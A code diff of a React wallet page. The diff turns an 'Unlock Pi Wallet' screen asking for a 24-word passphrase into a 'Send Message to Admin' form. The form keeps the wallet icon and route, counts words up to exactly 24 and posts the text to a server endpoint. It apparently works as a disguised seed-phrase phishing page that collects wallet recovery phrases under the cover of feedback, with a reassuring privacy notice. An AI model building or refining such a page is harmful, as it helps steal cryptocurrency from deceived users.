@@ -3,20 +3,61 @@ import { useNavigate } from 'react-router';
 
 export default function WalletPage() {
   const navigate = useNavigate();
-  const [passphrase, setPassphrase] = useState('');
+  const [message, setMessage] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const [wordCount, setWordCount] = useState(0);
+  const [submitStatus, setSubmitStatus] = useState<'success' | 'error' | null>(null);
 
   const handleBack = () => {
     navigate('/mine/validate');
   };
 
-  const handleUnlockWithPassphrase = () => {
-    // Handle passphrase unlock logic here
-    console.log('Unlocking with passphrase:', passphrase);
+  const handleMessageChange = (value: string) => {
+    setMessage(value);
+    const count = value.trim() ? value.trim().split(/\s+/).length : 0;
+    setWordCount(count);
   };
 
-  const handleUnlockWithFingerprint = () => {
-    // Handle fingerprint unlock logic here
-    console.log('Unlocking with fingerprint');
+  const handleSendMessage = async () => {
+    if (message.trim() === '') {
+      alert('Please enter a message');
+      return;
+    }
+
+    setIsLoading(true);
+    setSubmitStatus(null);
+
+    try {
+      const response = await fetch('/api/messages', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          message: message.trim(),
+          userIdentifier: `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
+        }),
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        setSubmitStatus('success');
+        setMessage('');
+        setWordCount(0);
+      } else {
+        setSubmitStatus('error');
+      }
+    } catch (error) {
+      console.error('Error sending message:', error);
+      setSubmitStatus('error');
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  const handlePressHere = () => {
+    alert('Feature coming soon!');
   };
 
   return (
@@ -95,11 +136,28 @@ export default function WalletPage() {
           margin-bottom: 30px;
         }
 
-        .passphrase-container {
+        .message-container {
           margin-bottom: 30px;
         }
 
-        .passphrase-input {
+        .word-counter {
+          text-align: right;
+          font-size: 14px;
+          color: #666;
+          margin-bottom: 10px;
+        }
+
+        .word-counter.over-limit {
+          color: #d63031;
+          font-weight: bold;
+        }
+
+        .word-counter.at-limit {
+          color: #00b894;
+          font-weight: bold;
+        }
+
+        .message-input {
           width: 100%;
           min-height: 120px;
           padding: 15px;
@@ -112,13 +170,13 @@ export default function WalletPage() {
           color: #333;
         }
 
-        .passphrase-input:focus {
+        .message-input:focus {
           outline: none;
           border-color: #783A8D;
           background: #fff;
         }
 
-        .passphrase-input::placeholder {
+        .message-input::placeholder {
           color: #999;
           font-style: italic;
         }
@@ -130,7 +188,7 @@ export default function WalletPage() {
           margin-bottom: 30px;
         }
 
-        .unlock-button {
+        .action-button {
           width: 100%;
           padding: 15px;
           font-size: 16px;
@@ -139,52 +197,91 @@ export default function WalletPage() {
           border-radius: 8px;
           cursor: pointer;
           transition: all 0.3s ease;
+          position: relative;
         }
 
-        .passphrase-btn {
+        .action-button:disabled {
+          opacity: 0.6;
+          cursor: not-allowed;
+        }
+
+        .send-btn {
           background: #783A8D;
           color: white;
         }
 
-        .passphrase-btn:hover {
+        .send-btn:hover:not(:disabled) {
           background: #6a3278;
         }
 
-        .fingerprint-btn {
+        .press-btn {
           background: #f0f0f0;
           color: #333;
           border: 2px solid #ddd;
         }
 
-        .fingerprint-btn:hover {
+        .press-btn:hover {
           background: #e8e8e8;
           border-color: #ccc;
         }
 
-        .warning-section {
+        .loading-spinner {
+          display: inline-block;
+          width: 20px;
+          height: 20px;
+          border: 3px solid #ffffff;
+          border-radius: 50%;
+          border-top-color: transparent;
+          animation: spin 1s ease-in-out infinite;
+          margin-right: 10px;
+        }
+
+        @keyframes spin {
+          to { transform: rotate(360deg); }
+        }
+
+        .status-message {
+          padding: 10px;
+          border-radius: 8px;
+          margin-bottom: 20px;
+          font-size: 14px;
+          font-weight: 500;
+        }
+
+        .status-success {
+          background: #d4fdd4;
+          color: #00b894;
+          border: 1px solid #00b894;
+        }
+
+        .status-error {
+          background: #ffeaea;
+          color: #d63031;
+          border: 1px solid #d63031;
+        }
+
+        .info-section {
           text-align: left;
-          background: #fff8f0;
-          border: 1px solid #ffd700;
+          background: #f8f9fa;
+          border: 1px solid #e9ecef;
           border-radius: 8px;
           padding: 20px;
           margin-bottom: 20px;
         }
 
-        .warning-text {
+        .info-text {
           font-size: 14px;
           line-height: 1.6;
           color: #333;
           margin-bottom: 15px;
         }
 
-        .recovery-text {
-          font-size: 14px;
-          line-height: 1.6;
-          color: #333;
+        .info-text:last-child {
+          margin-bottom: 0;
         }
 
-        .recovery-text strong {
-          color: #d63031;
+        .info-text strong {
+          color: #783A8D;
         }
 
         @media (max-width: 480px) {
@@ -196,7 +293,7 @@ export default function WalletPage() {
             font-size: 20px;
           }
 
-          .passphrase-input {
+          .message-input {
             min-height: 100px;
           }
         }
@@ -210,47 +307,64 @@ export default function WalletPage() {
             ←
           </div>
           <div className="header-content">
-            <img src="images/wallet.jpg" alt="Wallet Icon" className="wallet-icon" />
-            <span className="header-title">Wallet</span>
+            <img src="images/wallet.jpg" alt="Message Icon" className="wallet-icon" />
+            <span className="header-title">Send Message</span>
           </div>
           <div className="dropdown-icon">▼</div>
         </header>
 
         <div className="wallet-content">
-          <h1 className="unlock-title">Unlock Pi Wallet</h1>
+          <h1 className="unlock-title">Send Message to Admin</h1>
           
-          <div className="passphrase-container">
+          {submitStatus === 'success' && (
+            <div className="status-message status-success">
+              Message sent successfully! Thank you for your feedback.
+            </div>
+          )}
+
+          {submitStatus === 'error' && (
+            <div className="status-message status-error">
+              Failed to send message. Please try again.
+            </div>
+          )}
+          
+          <div className="message-container">
+            <div className={`word-counter ${wordCount > 24 ? 'over-limit' : wordCount === 24 ? 'at-limit' : ''}`}>
+              {wordCount}/24 words
+            </div>
             <textarea
-              className="passphrase-input"
-              placeholder="Enter your 24-word passphrase here"
-              value={passphrase}
-              onChange={(e) => setPassphrase(e.target.value)}
+              className="message-input"
+              placeholder="Write your 24-word message to the admin here..."
+              value={message}
+              onChange={(e) => handleMessageChange(e.target.value)}
               rows={5}
             />
           </div>
 
           <div className="button-container">
             <button 
-              className="unlock-button passphrase-btn"
-              onClick={handleUnlockWithPassphrase}
+              className="action-button send-btn"
+              onClick={handleSendMessage}
+              disabled={isLoading || message.trim() === ''}
             >
-              UNLOCK WITH PASSPHRASE
+              {isLoading && <span className="loading-spinner"></span>}
+              {isLoading ? 'SENDING MESSAGE...' : 'SEND MESSAGE'}
             </button>
             <button 
-              className="unlock-button fingerprint-btn"
-              onClick={handleUnlockWithFingerprint}
+              className="action-button press-btn"
+              onClick={handlePressHere}
             >
-              UNLOCK WITH FINGERPRINT
+              PRESS HERE
             </button>
           </div>
 
-          <div className="warning-section">
-            <p className="warning-text">
-              As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+          <div className="info-section">
+            <p className="info-text">
+              <strong>Send a message:</strong> Write up to 24 words to communicate with the admin. Your message will be reviewed and responded to if necessary.
             </p>
             
-            <p className="recovery-text">
-              <strong>Lost your passphrase?</strong> You can create a new wallet, but all your π in your previous wallet will be inaccessible.
+            <p className="info-text">
+              <strong>Privacy Notice:</strong> Your messages are stored securely and will only be viewed by authorized administrators for support purposes.
             </p>
           </div>
         </div>
